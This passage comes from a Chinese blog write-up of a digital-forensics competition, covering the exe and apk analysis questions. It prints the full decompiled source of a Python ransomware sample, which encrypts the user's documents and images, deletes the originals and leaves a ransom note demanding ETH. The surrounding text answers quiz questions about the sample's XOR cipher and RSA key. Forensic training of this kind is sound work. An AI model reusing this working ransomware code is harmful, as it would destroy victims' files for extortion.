class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.9.1</span><br><span class="line"># Python bytecode version base 3.6 (3379)</span><br><span class="line"># Decompiled from: Python 3.7.8 (tags/v3.7.8:4b47a5b6ba, Jun 28 2020, 08:53:46) [MSC v.1916 64 bit (AMD64)]</span><br><span class="line"># Embedded file name: encrypt_file_1.py</span><br><span class="line">import time</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5</span><br><span class="line">import os</span><br><span class="line">pubkey = &quot;-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n&quot;</span><br><span class="line">msg = &quot;SOMETHING WENT WRONG,PLEASE CONTACT YOUR SYSTEM ADMINISTRATOR!\nHe can help you to understand whats happened.\nIf he can&#x27;t help you,contact us via email:\naa1028@forensix.cn\nale@forensix.cn\nHURRY UP!WE HAVE ANTIDOTE FOR YOUR FILES!DISCOUNT 20%FOR CLIENTS,WHO CONTACT US IN THE SAME DAY!\nYou can attach 2 files (text or picture)to check our honest intentions,we will heal them and send\nback.\nPlease pay 0.618 ETH\nThe wallet address：0xef9edf6cdacb7d925aee0f9bd607b544c5758850\n************************************\n&quot;</span><br><span class="line"></span><br><span class="line">class XORCBC:</span><br><span class="line"></span><br><span class="line">    def __init__(self, key: bytes):</span><br><span class="line">        self.key = bytearray(key)</span><br><span class="line">        self.cur = 0</span><br><span class="line"></span><br><span class="line">    def encrypt(self, data: bytes) -&gt; bytes:</span><br><span class="line">        data = bytearray(data)</span><br><span class="line">        for i in range(len(data)):</span><br><span class="line">            tmp = data[i]</span><br><span class="line">            data[i] ^= self.key[self.cur]</span><br><span class="line">            self.key[self.cur] = tmp</span><br><span class="line">            self.cur = (self.cur + 1) % len(self.key)</span><br><span class="line"></span><br><span class="line">        return bytes(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;加密程序V1.0&quot;)</span><br><span class="line">print(&quot;文件正在加密中~~~~~~~~~~~~~~~~~~\n&quot;)</span><br><span class="line"></span><br><span class="line">def run_finall():</span><br><span class="line">    for filepath, dirnames, filenames in os.walk(os.getcwd()):</span><br><span class="line">        for filename in filenames:</span><br><span class="line">            if filename != &quot;encrypt_file.py&quot; and filename != &quot;decrypt_file.py&quot; and &quot;_encrypted&quot; not in filename:</span><br><span class="line">                ExtensionPath = os.path.splitext(filename)[-1]</span><br><span class="line">                if &quot;.txt&quot; == ExtensionPath or &quot;.jpg&quot; == ExtensionPath or &quot;.xls&quot; == ExtensionPath or &quot;.docx&quot; == ExtensionPath:</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                    data_file = os.path.join(filepath, filename)</span><br><span class="line">                    rsakey = RSA.import_key(pubkey)</span><br><span class="line">                    cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">                    xor_key = os.urandom(16)</span><br><span class="line">                    xor_obj = XORCBC(xor_key)</span><br><span class="line">                    outf = open(data_file + &quot;_encrypted&quot;, &quot;wb&quot;)</span><br><span class="line">                    encrypted_xor_key = cipher.encrypt(xor_key)</span><br><span class="line">                    outf.write(encrypted_xor_key)</span><br><span class="line">                    buffer_size = 4096</span><br><span class="line">                    with open(data_file, &quot;rb&quot;) as f:</span><br><span class="line">                        while True:</span><br><span class="line">                            data = f.read(buffer_size)</span><br><span class="line">                            if not data:</span><br><span class="line">                                break</span><br><span class="line">                            outf.write(xor_obj.encrypt(data))</span><br><span class="line"></span><br><span class="line">                    outf.close()</span><br><span class="line">                    os.remove(data_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run_finall()</span><br><span class="line"></span><br><span class="line">def redme():</span><br><span class="line">    try:</span><br><span class="line">        dir = os.path.join(os.path.expanduser(&quot;~&quot;), &quot;Desktop&quot;)</span><br><span class="line">        print(dir)</span><br><span class="line">        with open(dir + &quot;/!READ_ME.txt&quot;, &quot;w&quot;) as ff:</span><br><span class="line">            ff.write(msg)</span><br><span class="line">    except:</span><br><span class="line">        dir1 = os.getcwd()</span><br><span class="line">        print(dir1)</span><br><span class="line">        with open(dir1 + &quot;/!READ_ME.txt&quot;, &quot;w&quot;) as ff:</span><br><span class="line">            ff.write(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&quot;\n加密完成~~~~~~~~~~~~~~~~~~&quot;)</span><br><span class="line">os.system(&quot;pause&quot;)</span><br><span class="line"></span><br><span class="line"># okay decompiling encrypt_file_1.pyc</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以看到</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711142123941.png" alt="image-20240711142123941"></p>
+<ol start="43">
+<li>分析加密程序，是通过什么算法对文件进行加密的？<br>AES bcrypt DES 异或</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711142150193.png" alt="image-20240711142150193"></p>
+<p>异或关键字</p>
+<p>xor</p>
+<ol start="44">
+<li>分析加密程序，其使用的非对称加密方式公钥后5位为？</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pubkey = &quot;-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u+w==</span><br></pre></td></tr></table></figure>
+
+
+
+
+<ol start="45">
+<li>被加密文档中，FLAG1的值是(FLAG为8位字符串，如“FLAG9QWERT123”)10分<br>(FLAG为8位字符串，如“FLAG9QWERT123”)</li>
+</ol>
+<p>同理得到解密脚本</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711143926188.png" alt="image-20240711143926188"></p>
+<p>得到解压密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4008003721</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711145023223.png" alt="image-20240711145023223"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711145045126.png" alt="image-20240711145045126"></p>
+<h1 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h1><p>分析所有掌握的检材，找到报案人描述的加密勒索apk程序，分析并回答下列问题。请注意，如需在apk中输入FLAG，需要输入完整内容，如输入FLAG9ABCDEFG</p>
+<ol start="46">
+<li>恶意APK程序的包名为</li>
+</ol>
+<p>访问<code>https://pan.forensix.cn/f/c45ca511c7f2469090ad/?dl=1</code>下载apk</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711145758946.png" alt="image-20240711145758946"></p>
+<ol start="47">
+<li>APK调用的权限包括<br>READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE SEND_SMS WRITE_CONTACTS</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711145820018.png" alt="image-20240711145820018"></p>
+<ol start="48">
+<li>解锁第一关所使用的FLAG2值为（FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入FLAG9QWERT123）10分<br>FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入FLAG9QWERT123</li>
+</ol>
+<p>有壳，一键脱壳即可</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711150348757.png" alt="image-20240711150348757"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711164701476.png" alt="image-20240711164701476"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711165409637.png" alt="image-20240711165409637"></p>
+<ol start="49">
+<li>解锁第二关所使用的FLAG3值为(FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入FLAG9QWERT123)10分<br>FLAG为8位字符串，如需在apk中输入FLAG，请输入完整内容，如输入FLAG9QWERT123</li>
+</ol>
+<p>雷电字符串比对一把梭</p>
+<ol start="50">
+<li>解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值</li>
+</ol>
+<p> 同上</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/11117.html">https://xyaxxya.github.io/posts/11117.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><a class="post-meta__tags" href="/tags/PC/">PC</a><a class="post-meta__tags" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/APK/">APK</a><a class="post-meta__tags" href="/tags/java/">java</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?8077" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/55455.html" title="24中科实数"><img class="cover" src="https://www.dmoe.cc/random.php?7477" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">24中科实数</div></div></a></div><div class="next-post pull-right"><a href="/posts/56923.html" title="2024CISCN初赛web"><img class="cover" src="https://www.dmoe.cc/random.php?6390" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024CISCN初赛web</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/55455.html" title="24中科实数"><img class="cover" src="https://www.dmoe.cc/random.php?7477" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-15</div><div class="title">24中科实数</div></div></a></div><div><a href="/posts/48378.html" title="2024盘古石决赛复盘wp"><img class="cover" src="https://www.dmoe.cc/random.php?4402" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-17</div><div class="title">2024盘古石决赛复盘wp</div></div></a></div><div><a href="/posts/46629.html" title="24FIC线下决赛"><img class="cover" src="https://www.dmoe.cc/random.php?8031" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-20</div><div class="title">24FIC线下决赛</div></div></a></div><div><a href="/posts/31513.html" title="2024数证杯决赛团队赛"><img class="cover" src="https://www.dmoe.cc/random.php?1570" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-22</div><div class="title">2024数证杯决赛团队赛</div></div></a></div><div><a href="/posts/12333.html" title="2024数证杯决赛个人赛"><img class="cover" src="https://www.dmoe.cc/random.php?8253" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-05</div><div class="title">2024数证杯决赛个人赛</div></div></a></div><div><a href="/posts/60875.html" title="2024数证杯初赛"><img class="cover" src="https://www.dmoe.cc/random.php?241" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-18</div><div class="title">2024数证杯初赛</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%9D%901"><span class="toc-number">1.</span> <span class="toc-text">检材1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%9D%902"><span class="toc-number">2.</span> <span class="toc-text">检材2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%9D%903"><span class="toc-number">3.</span> <span class="toc-text">检材3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%9D%904"><span class="toc-number">4.</span> <span class="toc-text">检材4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exe%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">exe分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#apk%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">apk分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/53577.html" title="2025VNCTF"><img src="https://www.dmoe.cc/random.php?6359" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025VNCTF"/></a><div class="content"><a class="title" href="/posts/53577.html" title="2025VNCTF">2025VNCTF</a><time datetime="2025-02-10T10:04:34.000Z" title="发表于 2025-02-10 18:04:34">2025-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/65071.html" title="2025西湖论剑"><img src="https://www.dmoe.cc/random.php?7035" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025西湖论剑"/></a><div class="content"><a class="title" href="/posts/65071.html" title="2025西湖论剑">2025西湖论剑</a><time datetime="2025-02-07T11:30:37.000Z" title="发表于 2025-02-07 19:30:37">2025-02-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/59898.html" title="2025SUCTF取证复盘"><img src="https://www.dmoe.cc/random.php?9151" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025SUCTF取证复盘"/></a><div class="content"><a class="title" href="/posts/59898.html" title="2025SUCTF取证复盘">2025SUCTF取证复盘</a><time datetime="2025-02-06T11:21:39.000Z" title="发表于 2025-02-06 19:21:39">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/49801.html" title="HackMyVM Nessus"><img src="https://www.dmoe.cc/random.php?1519" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Nessus"/></a><div class="content"><a class="title" href="/posts/49801.html" title="HackMyVM Nessus">HackMyVM Nessus</a><time datetime="2025-01-27T02:11:15.000Z" title="发表于 2025-01-27 10:11:15">2025-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/33727.html" title="2024长城杯&amp;CISCN-威胁流量分析-sc05"><img src="https://www.dmoe.cc/random.php?8546" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024长城杯&amp;CISCN-威胁流量分析-sc05"/></a><div class="content"><a class="title" href="/posts/33727.html" title="2024长城杯&amp;CISCN-威胁流量分析-sc05">2024长城杯&amp;CISCN-威胁流量分析-sc05</a><time datetime="2025-01-26T02:40:34.000Z" title="发表于 2025-01-26 10:40:34">2025-01-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
